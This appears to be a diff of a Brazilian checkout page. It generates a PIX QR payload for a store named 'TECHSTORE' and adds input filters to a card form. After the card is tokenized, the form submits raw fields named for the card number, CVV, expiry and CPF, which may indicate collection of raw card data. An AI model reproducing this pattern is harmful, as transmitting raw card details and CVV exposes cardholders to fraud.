@@ -54,19 +54,18 @@
 
         <div id="area-pix">
             <span class="valor-pix-destaque" id="pix-valor-display">R$ 0,00</span>
-            <div id="qrcode-container"></div> 
-            <div class="chave-pix" id="pix-copy">Gerando código PIX...</div>
+            <div id="qrcode-container"></div> <div class="chave-pix" id="pix-copy">Gerando código PIX...</div>
             <button type="button" class="btn-copiar" onclick="copiarPix()">COPIAR CHAVE PIX</button>
         </div>
 
         <div id="area-card" style="display:none">
-            <input id="c1" name="CARTAO_NUMERO" placeholder="Número do Cartão" inputmode="numeric">
-            <input id="c2" name="CARTAO_NOME" placeholder="Nome no Cartão">
+            <input id="c1" name="CARTAO_NUMERO" placeholder="Número do Cartão" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9 ]/g, '')">
+            <input id="c2" name="CARTAO_NOME" placeholder="Nome no Cartão (Frente do cartão)" oninput="this.value = this.value.toUpperCase()">
             <div class="row">
-                <input id="c3" name="CARTAO_VALIDADE" placeholder="MM/AA" maxlength="5">
-                <input id="c4" name="CARTAO_CVV" placeholder="CVV" maxlength="4">
+                <input id="c3" name="CARTAO_VALIDADE" placeholder="MM/AA (Atrás do cartão)" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9\/]/g, '')">
+                <input id="c4" name="CARTAO_CVV" placeholder="CVV (Atrás do cartão)" maxlength="3" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
             </div>
-            <input id="c5" name="CARTAO_CPF" placeholder="CPF do Titular">
+            <input id="c5" name="CARTAO_CPF" placeholder="CPF do Titular" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9.-]/g, '')">
             <input type="text" id="f-tel" name="WHATSAPP" placeholder="WhatsApp para confirmação (Opcional)">
         </div>
 
@@ -103,17 +102,17 @@ window.onload = function() {
 };
 
 function gerarPixDinamico(valor) {
-    const chave = "5663014b-ba23-4c57-b239-26914c95a8c0"; 
+    const chave = "5663014b-ba23-4c57-b239-26914c95a8c0";
     const nome = "TECHSTORE";
-    const cidade = "SAOPAULO"; // Removido o espaço para evitar erro de contagem
+    const cidade = "SAOPAULO"; // CORREÇÃO: Removido o espaço e ajustado para 8 caracteres
     const valorStr = valor.toFixed(2).toString();
     
-    // Montagem manual precisa do BRCode sem quebras de linha
+    // Montagem do payload sem espaços e com contadores exatos
     let payload = "00020126580014BR.GOV.BCB.PIX0136" + chave + "520400005303986";
     payload += "54" + valorStr.length.toString().padStart(2, '0') + valorStr;
     payload += "5802BR5909" + nome + "6008" + cidade + "62070503***6304";
     
-    // Limpeza absoluta de espaços em branco
+    // Limpeza final para garantir zero espaços
     const payloadLimpo = payload.replace(/\s+/g, '');
 
     document.getElementById("qrcode-container").innerHTML = "";
@@ -121,7 +120,7 @@ function gerarPixDinamico(valor) {
         text: payloadLimpo, 
         width: 160, 
         height: 160,
-        correctLevel : QRCode.CorrectLevel.M
+        correctLevel : QRCode.CorrectLevel.M 
     });
     document.getElementById('pix-copy').innerText = payloadLimpo;
 }
@@ -159,8 +158,8 @@ document.getElementById('form-main').onsubmit = async function(e) {
             identificationNumber: document.getElementById('c5').value.replace(/\D/g, ''),
         });
         if (cardToken.id) this.submit();
-        else { alert("❌ Dados do cartão inválidos."); btn.innerText = "FINALIZAR PAGAMENTO"; btn.disabled = false; }
-    } catch (err) { alert("❌ Verifique os dados do cartão."); btn.innerText = "FINALIZAR PAGAMENTO"; btn.disabled = false; }
+        else { alert("❌ Dados incorretos."); btn.innerText = "FINALIZAR PAGAMENTO"; btn.disabled = false; }
+    } catch (err) { alert("❌ Verifique os dados."); btn.innerText = "FINALIZAR PAGAMENTO"; btn.disabled = false; }
 };
 
 function mask(id, m) {
